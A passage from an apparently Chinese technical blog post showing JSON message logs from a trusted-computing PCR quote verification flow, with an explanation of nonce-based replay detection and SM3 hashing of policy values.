</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    5a93442bd1c974b77607314da3c0156bac929&#34;</span>,<span style="color:#f92672">&#34;receiver_uuid&#34;</span>:<span style="color:#e6db74">&#34;key_manage&#34;</span>,<span style="color:#f92672">&#34;route&#34;</span>:<span style="color:#e6db74">&#34;quo​
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    te_verify&#34;</span>,<span style="color:#f92672">&#34;flow&#34;</span>:<span style="color:#e6db74">&#34;QUERY&#34;</span>,<span style="color:#f92672">&#34;state&#34;</span>:<span style="color:#e6db74">&#34;MATCH&#34;</span>,<span style="color:#f92672">&#34;flag&#34;</span>:<span style="color:#e6db74">&#34;LOCAL&#34;</span>,<span style="color:#f92672">&#34;ljump&#34;</span>:<span style="color:#ae81ff">1</span>,<span style="color:#f92672">&#34;rjump&#34;</span>:<span style="color:#ae81ff">2</span>,<span style="color:#f92672">&#34;re​
</span></span></span><span style="display:flex;"><span><span style="color:#f92672">    cord_type&#34;</span>:<span style="color:#e6db74">&#34;GENERAL_RETURN&#34;</span>,<span style="color:#f92672">&#34;record_subtype&#34;</span>:<span style="color:#e6db74">&#34;STRING&#34;</span>,<span style="color:#f92672">&#34;record_num&#34;</span>:<span style="color:#ae81ff">1</span>,<span style="color:#f92672">&#34;record_siz​
</span></span></span><span style="display:flex;"><span><span style="color:#f92672">    e&#34;</span>:<span style="color:#ae81ff">12</span>,<span style="color:#f92672">&#34;expand_num&#34;</span>:<span style="color:#ae81ff">2</span>,<span style="color:#f92672">&#34;expand_size&#34;</span>:<span style="color:#ae81ff">439</span>,<span style="color:#f92672">&#34;msg_uuid&#34;</span>:<span style="color:#e6db74">&#34;533de83d72e1ee88792152dfbfbf1​
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    d1026f00167ba4bbd260e86f57c16de396e&#34;</span>},<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&#34;RECORD&#34;</span>:[<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    {<span style="color:#f92672">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;pcrquote&#34;</span>,<span style="color:#f92672">&#34;return_value&#34;</span>:<span style="color:#e6db74">&#34;14&#34;</span>}<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    ],<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&#34;EXPAND&#34;</span> :[<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    {<span style="color:#f92672">&#34;data_size&#34;</span>:<span style="color:#ae81ff">0</span>,<span style="color:#f92672">&#34;type&#34;</span>:<span style="color:#e6db74">&#34;MESSAGE&#34;</span>,<span style="color:#f92672">&#34;subtype&#34;</span>:<span style="color:#e6db74">&#34;INSTANCE_INFO&#34;</span>,<span style="color:#f92672">&#34;expand&#34;</span>:<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        {<span style="color:#f92672">&#34;proc_name&#34;</span>:<span style="color:#e6db74">&#34;term&#34;</span>,<span style="color:#f92672">&#34;node_uuid&#34;</span>:<span style="color:#e6db74">&#34;0fc56bb95fc2a0e6685fec12f31ea1cc03d470fa819f890​
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            38822b9741741d8b2&#34;</span>,<span style="color:#f92672">&#34;user_name&#34;</span>:<span style="color:#e6db74">&#34;zhao&#34;</span>}<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        },<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    {<span style="color:#f92672">&#34;data_size&#34;</span>:<span style="color:#ae81ff">0</span>,<span style="color:#f92672">&#34;type&#34;</span>:<span style="color:#e6db74">&#34;TCM_PIK_DESC&#34;</span>,<span style="color:#f92672">&#34;subtype&#34;</span>:<span style="color:#e6db74">&#34;PCRQUOTE&#34;</span>,<span style="color:#f92672">&#34;expand&#34;</span>:<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        {<span style="color:#f92672">&#34;userinfo&#34;</span>:<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>            {<span style="color:#f92672">&#34;username&#34;</span>:<span style="color:#e6db74">&#34;zhao&#34;</span>,<span style="color:#f92672">&#34;user_role&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#f92672">&#34;node_uuid&#34;</span>:<span style="color:#e6db74">&#34;0fc56bb95fc2a0e6685fec12f31ea1cc0​
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                3d470fa819f89038822b9741741d8b2&#34;</span>,<span style="color:#f92672">&#34;node_name&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#f92672">&#34;expand_digest&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#f92672">&#34;describe&#34;</span>:<span style="color:#e6db74">&#34;q​
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                uote_report test&#34;</span>},<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;pcrComp&#34;</span>:{<span style="color:#f92672">&#34;select&#34;</span>:<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>                {<span style="color:#f92672">&#34;sizeOfSelect&#34;</span>:<span style="color:#ae81ff">0</span>,<span style="color:#f92672">&#34;pcrSelect&#34;</span>:<span style="color:#e6db74">&#34;AEAA&#34;</span>},<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&#34;valueSize&#34;</span>:<span style="color:#ae81ff">32</span>,<span style="color:#f92672">&#34;pcrValue&#34;</span>:<span style="color:#e6db74">&#34;Pg0UXi2+FrqjK47s7+0C50WClHt15b27QjyxccClMz0&#34;</span>},<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;nonce&#34;</span>:<span style="color:#e6db74">&#34;fded59495cb4a8c1ecae6d8f801fca1f541dffc36cf1ed10281bf3323d2722fa&#34;</span>,<span style="color:#f92672">&#34;sign​
</span></span></span><span style="display:flex;"><span><span style="color:#f92672">            Len&#34;</span>:<span style="color:#ae81ff">64</span>,<span style="color:#f92672">&#34;signData&#34;</span>:<span style="color:#e6db74">&#34;drc3tcDRf33OKS/wKZbBGjP8cKuxIFGixmv+g0mRJAGUtGfYRxcYKyjxnIRt​
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            yx4BOdTdWUEblhUlLjOtHjoN0w&#34;</span>}<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        }<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    ]<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>}<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">************************************************************​</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// key_manage 向 quote_report 转发信息​
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>{<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">&#34;HEAD&#34;</span>:{<span style="color:#f92672">&#34;tag&#34;</span>:<span style="color:#e6db74">&#34;MESG&#34;</span>,<span style="color:#f92672">&#34;version&#34;</span>:<span style="color:#ae81ff">65537</span>,<span style="color:#f92672">&#34;sender_uuid&#34;</span>:<span style="color:#e6db74">&#34;key_manage&#34;</span>,<span style="color:#f92672">&#34;receiver_uuid&#34;</span><span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    :<span style="color:#e6db74">&#34;quote_report&#34;</span>,<span style="color:#f92672">&#34;route&#34;</span>:<span style="color:#e6db74">&#34;quote_verify&#34;</span>,<span style="color:#f92672">&#34;flow&#34;</span>:<span style="color:#e6db74">&#34;QUERY&#34;</span>,<span style="color:#f92672">&#34;state&#34;</span>:<span style="color:#e6db74">&#34;MATCH&#34;</span>,<span style="color:#f92672">&#34;flag&#34;</span>:<span style="color:#e6db74">&#34;LO​
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    CAL&#34;</span>,<span style="color:#f92672">&#34;ljump&#34;</span>:<span style="color:#ae81ff">2</span>,<span style="color:#f92672">&#34;rjump&#34;</span>:<span style="color:#ae81ff">2</span>,<span style="color:#f92672">&#34;record_type&#34;</span>:<span style="color:#e6db74">&#34;GENERAL_RETURN&#34;</span>,<span style="color:#f92672">&#34;record_subtype&#34;</span>:<span style="color:#e6db74">&#34;STRING​
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;</span>,<span style="color:#f92672">&#34;record_num&#34;</span>:<span style="color:#ae81ff">1</span>,<span style="color:#f92672">&#34;record_size&#34;</span>:<span style="color:#ae81ff">12</span>,<span style="color:#f92672">&#34;expand_num&#34;</span>:<span style="color:#ae81ff">2</span>,<span style="color:#f92672">&#34;expand_size&#34;</span>:<span style="color:#ae81ff">439</span>,<span style="color:#f92672">&#34;msg_uuid&#34;</span>:<span style="color:#e6db74">&#34;5​
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    33de83d72e1ee88792152dfbfbf1d1026f00167ba4bbd260e86f57c16de396e&#34;</span>},<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&#34;RECORD&#34;</span>:[<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    {<span style="color:#f92672">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;pcrquote&#34;</span>,<span style="color:#f92672">&#34;return_value&#34;</span>:<span style="color:#e6db74">&#34;14&#34;</span>}<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    ],<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&#34;EXPAND&#34;</span> :[<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    {<span style="color:#f92672">&#34;data_size&#34;</span>:<span style="color:#ae81ff">0</span>,<span style="color:#f92672">&#34;type&#34;</span>:<span style="color:#e6db74">&#34;MESSAGE&#34;</span>,<span style="color:#f92672">&#34;subtype&#34;</span>:<span style="color:#e6db74">&#34;INSTANCE_INFO&#34;</span>,<span style="color:#f92672">&#34;expand&#34;</span>:<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        {<span style="color:#f92672">&#34;proc_name&#34;</span>:<span style="color:#e6db74">&#34;term&#34;</span>,<span style="color:#f92672">&#34;node_uuid&#34;</span>:<span style="color:#e6db74">&#34;0fc56bb95fc2a0e6685fec12f31ea1cc03d470fa819f890​
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            38822b9741741d8b2&#34;</span>,<span style="color:#f92672">&#34;user_name&#34;</span>:<span style="color:#e6db74">&#34;zhao&#34;</span>}<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        },<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    {<span style="color:#f92672">&#34;data_size&#34;</span>:<span style="color:#ae81ff">0</span>,<span style="color:#f92672">&#34;type&#34;</span>:<span style="color:#e6db74">&#34;TCM_PIK_DESC&#34;</span>,<span style="color:#f92672">&#34;subtype&#34;</span>:<span style="color:#e6db74">&#34;PCRQUOTE&#34;</span>,<span style="color:#f92672">&#34;expand&#34;</span>:<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        {<span style="color:#f92672">&#34;userinfo&#34;</span>:<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>            {<span style="color:#f92672">&#34;username&#34;</span>:<span style="color:#e6db74">&#34;zhao&#34;</span>,<span style="color:#f92672">&#34;user_role&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#f92672">&#34;node_uuid&#34;</span>:<span style="color:#e6db74">&#34;0fc56bb95fc2a0e6685fec12f31ea1cc0​
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                3d470fa819f89038822b9741741d8b2&#34;</span>,<span style="color:#f92672">&#34;node_name&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#f92672">&#34;expand_digest&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#f92672">&#34;describe&#34;</span>:<span style="color:#e6db74">&#34;q​
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                uote_report test&#34;</span>},<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;pcrComp&#34;</span>:{<span style="color:#f92672">&#34;select&#34;</span>:<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>                {<span style="color:#f92672">&#34;sizeOfSelect&#34;</span>:<span style="color:#ae81ff">0</span>,<span style="color:#f92672">&#34;pcrSelect&#34;</span>:<span style="color:#e6db74">&#34;AEAA&#34;</span>},<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&#34;valueSize&#34;</span>:<span style="color:#ae81ff">32</span>,<span style="color:#f92672">&#34;pcrValue&#34;</span>:<span style="color:#e6db74">&#34;Pg0UXi2+FrqjK47s7+0C50WClHt15b27QjyxccClMz0&#34;</span>},<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;nonce&#34;</span>:<span style="color:#e6db74">&#34;fded59495cb4a8c1ecae6d8f801fca1f541dffc36cf1ed10281bf3323d2722fa&#34;</span>,<span style="color:#f92672">&#34;sign​
</span></span></span><span style="display:flex;"><span><span style="color:#f92672">            Len&#34;</span>:<span style="color:#ae81ff">64</span>,<span style="color:#f92672">&#34;signData&#34;</span>:<span style="color:#e6db74">&#34;drc3tcDRf33OKS/wKZbBGjP8cKuxIFGixmv+g0mRJAGUtGfYRxcYKyjxnIRt​
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            yx4BOdTdWUEblhUlLjOtHjoN0w&#34;</span>}<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        }<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    ]<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>}<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">************************************************************​</span>
</span></span><span style="display:flex;"><span>{<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">&#34;HEAD&#34;</span>:{<span style="color:#f92672">&#34;tag&#34;</span>:<span style="color:#e6db74">&#34;MESG&#34;</span>,<span style="color:#f92672">&#34;version&#34;</span>:<span style="color:#ae81ff">65537</span>,<span style="color:#f92672">&#34;sender_uuid&#34;</span>:<span style="color:#e6db74">&#34;quote_report&#34;</span>,<span style="color:#f92672">&#34;receiver_uui​
</span></span></span><span style="display:flex;"><span><span style="color:#f92672">    d&#34;</span>:<span style="color:#e6db74">&#34;key_manage&#34;</span>,<span style="color:#f92672">&#34;route&#34;</span>:<span style="color:#e6db74">&#34;quote_verify&#34;</span>,<span style="color:#f92672">&#34;flow&#34;</span>:<span style="color:#e6db74">&#34;QUERY&#34;</span>,<span style="color:#f92672">&#34;state&#34;</span>:<span style="color:#e6db74">&#34;MATCH&#34;</span>,<span style="color:#f92672">&#34;flag&#34;</span>:<span style="color:#e6db74">&#34;LO​
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    CAL&#34;</span>,<span style="color:#f92672">&#34;ljump&#34;</span>:<span style="color:#ae81ff">3</span>,<span style="color:#f92672">&#34;rjump&#34;</span>:<span style="color:#ae81ff">2</span>,<span style="color:#f92672">&#34;record_type&#34;</span>:<span style="color:#e6db74">&#34;GENERAL_RETURN&#34;</span>,<span style="color:#f92672">&#34;record_subtype&#34;</span>:<span style="color:#e6db74">&#34;STRING​
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;</span>,<span style="color:#f92672">&#34;record_num&#34;</span>:<span style="color:#ae81ff">1</span>,<span style="color:#f92672">&#34;record_size&#34;</span>:<span style="color:#ae81ff">12</span>,<span style="color:#f92672">&#34;expand_num&#34;</span>:<span style="color:#ae81ff">2</span>,<span style="color:#f92672">&#34;expand_size&#34;</span>:<span style="color:#ae81ff">439</span>,<span style="color:#f92672">&#34;msg_uuid&#34;</span>:<span style="color:#e6db74">&#34;5​
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    33de83d72e1ee88792152dfbfbf1d1026f00167ba4bbd260e86f57c16de396e&#34;</span>},<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&#34;RECORD&#34;</span>:[<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    {<span style="color:#f92672">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;pcrquote&#34;</span>,<span style="color:#f92672">&#34;return_value&#34;</span>:<span style="color:#e6db74">&#34;14&#34;</span>}<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    ],<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&#34;EXPAND&#34;</span> :[<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    {<span style="color:#f92672">&#34;data_size&#34;</span>:<span style="color:#ae81ff">0</span>,<span style="color:#f92672">&#34;type&#34;</span>:<span style="color:#e6db74">&#34;MESSAGE&#34;</span>,<span style="color:#f92672">&#34;subtype&#34;</span>:<span style="color:#e6db74">&#34;INSTANCE_INFO&#34;</span>,<span style="color:#f92672">&#34;expand&#34;</span>:<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        {<span style="color:#f92672">&#34;proc_name&#34;</span>:<span style="color:#e6db74">&#34;term&#34;</span>,<span style="color:#f92672">&#34;node_uuid&#34;</span>:<span style="color:#e6db74">&#34;0fc56bb95fc2a0e6685fec12f31ea1cc03d470fa819f890​
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            38822b9741741d8b2&#34;</span>,<span style="color:#f92672">&#34;user_name&#34;</span>:<span style="color:#e6db74">&#34;zhao&#34;</span>}<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        },<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    {<span style="color:#f92672">&#34;data_size&#34;</span>:<span style="color:#ae81ff">0</span>,<span style="color:#f92672">&#34;type&#34;</span>:<span style="color:#e6db74">&#34;TCM_KEY_DESC&#34;</span>,<span style="color:#f92672">&#34;subtype&#34;</span>:<span style="color:#e6db74">&#34;VERIFY_DESC&#34;</span>,<span style="color:#f92672">&#34;expand&#34;</span>:<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        {<span style="color:#f92672">&#34;result&#34;</span>:<span style="color:#ae81ff">0</span>,<span style="color:#f92672">&#34;object_uuid&#34;</span>:<span style="color:#e6db74">&#34;8267080f87fc66a093200ca17c4ca06cec4327d1dafcab861955f​
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            d47c74cf259&#34;</span>,<span style="color:#f92672">&#34;verifykey_uuid&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>}<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        }<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    ]<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>}<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">************************************************************​</span>
</span></span><span style="display:flex;"><span>{<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">&#34;HEAD&#34;</span>:{<span style="color:#f92672">&#34;tag&#34;</span>:<span style="color:#e6db74">&#34;MESG&#34;</span>,<span style="color:#f92672">&#34;version&#34;</span>:<span style="color:#ae81ff">65537</span>,<span style="color:#f92672">&#34;sender_uuid&#34;</span>:<span style="color:#e6db74">&#34;key_manage&#34;</span>,<span style="color:#f92672">&#34;receiver_uuid&#34;</span><span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    :<span style="color:#e6db74">&#34;7862491328c47d0648b97c5abd15a93442bd1c974b77607314da3c0156bac929&#34;</span>,<span style="color:#f92672">&#34;route&#34;</span>:<span style="color:#e6db74">&#34;quo​
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    te_verify&#34;</span>,<span style="color:#f92672">&#34;flow&#34;</span>:<span style="color:#e6db74">&#34;QUERY&#34;</span>,<span style="color:#f92672">&#34;state&#34;</span>:<span style="color:#e6db74">&#34;RESPONSE&#34;</span>,<span style="color:#f92672">&#34;flag&#34;</span>:<span style="color:#e6db74">&#34;NULL&#34;</span>,<span style="color:#f92672">&#34;ljump&#34;</span>:<span style="color:#ae81ff">4</span>,<span style="color:#f92672">&#34;rjump&#34;</span>:<span style="color:#ae81ff">2</span>,<span style="color:#f92672">&#34;​
</span></span></span><span style="display:flex;"><span><span style="color:#f92672">    record_type&#34;</span>:<span style="color:#e6db74">&#34;GENERAL_RETURN&#34;</span>,<span style="color:#f92672">&#34;record_subtype&#34;</span>:<span style="color:#e6db74">&#34;STRING&#34;</span>,<span style="color:#f92672">&#34;record_num&#34;</span>:<span style="color:#ae81ff">1</span>,<span style="color:#f92672">&#34;record_s​
</span></span></span><span style="display:flex;"><span><span style="color:#f92672">    ize&#34;</span>:<span style="color:#ae81ff">12</span>,<span style="color:#f92672">&#34;expand_num&#34;</span>:<span style="color:#ae81ff">3</span>,<span style="color:#f92672">&#34;expand_size&#34;</span>:<span style="color:#ae81ff">439</span>,<span style="color:#f92672">&#34;msg_uuid&#34;</span>:<span style="color:#e6db74">&#34;533de83d72e1ee88792152dfbfb​
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    f1d1026f00167ba4bbd260e86f57c16de396e&#34;</span>},<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&#34;RECORD&#34;</span>:[<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    {<span style="color:#f92672">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;pcrquote&#34;</span>,<span style="color:#f92672">&#34;return_value&#34;</span>:<span style="color:#e6db74">&#34;14&#34;</span>}<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    ],<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&#34;EXPAND&#34;</span> :[<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    {<span style="color:#f92672">&#34;data_size&#34;</span>:<span style="color:#ae81ff">0</span>,<span style="color:#f92672">&#34;type&#34;</span>:<span style="color:#e6db74">&#34;MESSAGE&#34;</span>,<span style="color:#f92672">&#34;subtype&#34;</span>:<span style="color:#e6db74">&#34;INSTANCE_INFO&#34;</span>,<span style="color:#f92672">&#34;expand&#34;</span>:<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        {<span style="color:#f92672">&#34;proc_name&#34;</span>:<span style="color:#e6db74">&#34;term&#34;</span>,<span style="color:#f92672">&#34;node_uuid&#34;</span>:<span style="color:#e6db74">&#34;0fc56bb95fc2a0e6685fec12f31ea1cc03d470fa819f890​
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            38822b9741741d8b2&#34;</span>,<span style="color:#f92672">&#34;user_name&#34;</span>:<span style="color:#e6db74">&#34;zhao&#34;</span>}<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        },<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    {<span style="color:#f92672">&#34;data_size&#34;</span>:<span style="color:#ae81ff">0</span>,<span style="color:#f92672">&#34;type&#34;</span>:<span style="color:#e6db74">&#34;TCM_KEY_DESC&#34;</span>,<span style="color:#f92672">&#34;subtype&#34;</span>:<span style="color:#e6db74">&#34;VERIFY_DESC&#34;</span>,<span style="color:#f92672">&#34;expand&#34;</span>:<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        {<span style="color:#f92672">&#34;result&#34;</span>:<span style="color:#ae81ff">0</span>,<span style="color:#f92672">&#34;object_uuid&#34;</span>:<span style="color:#e6db74">&#34;8267080f87fc66a093200ca17c4ca06cec4327d1dafcab861955f​
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            d47c74cf259&#34;</span>,<span style="color:#f92672">&#34;verifykey_uuid&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>}<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        },<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    {<span style="color:#f92672">&#34;data_size&#34;</span>:<span style="color:#ae81ff">0</span>,<span style="color:#f92672">&#34;type&#34;</span>:<span style="color:#e6db74">&#34;GENERAL_RETURN&#34;</span>,<span style="color:#f92672">&#34;subtype&#34;</span>:<span style="color:#e6db74">&#34;STRING&#34;</span>,<span style="color:#f92672">&#34;expand&#34;</span>:<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        {<span style="color:#f92672">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;policy_choice&#34;</span>,<span style="color:#f92672">&#34;return_value&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>}<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        }<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    ]<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>}<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">************************************************************</span>
</span></span></code></pre></div><p>其中关键部分是需要对 <code>sender</code> 发送的 <code>nonce</code> 进行对比，若不相等，则认为在进行重放攻击，将 <code>solve_result</code> 设置为 <code>error</code>。​
若 <code>nonce</code> 检测通过，则需要对 <code>pcrValue</code> 进行校验，其校验规则为初始值拼接策略的值后进行 SM3 哈希计算，其中四个策略的值如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JSON" data-lang="JSON"><span style="display:flex;"><span>{<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;type&#34;</span>:<span style="color:#e6db74">&#34;GENERAL_RETURN&#34;</span>,<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;subtype&#34;</span>:<span style="color:#e6db74">&#34;UUID&#34;</span><span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>}<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>{<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;research&#34;</span>,<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;return_value&#34;</span>:<span style="color:#e6db74">&#34;1b483aa95573a38b95f9f866ff7586ade43a686f165fd7875125583cf4a73de4&#34;</span>,<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>}<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>{<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;product&#34;</span>,<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;return_value&#34;</span>:<span style="color:#e6db74">&#34;7a4d7b56552b0d20c1f7566eacdfb5232e627c537aba89143a17fc7a92007f6a&#34;</span>,<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>}<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>{<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;test&#34;</span>,<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;return_value&#34;</span>:<span style="color:#e6db74">&#34;660ca5ea8b7b7f4256d2bdf30a829da85820376020c1167ee232cc74ed6a126f&#34;</span>,<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>}<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>{<span style="color:#960050;background-color:#1e0010">​</span>
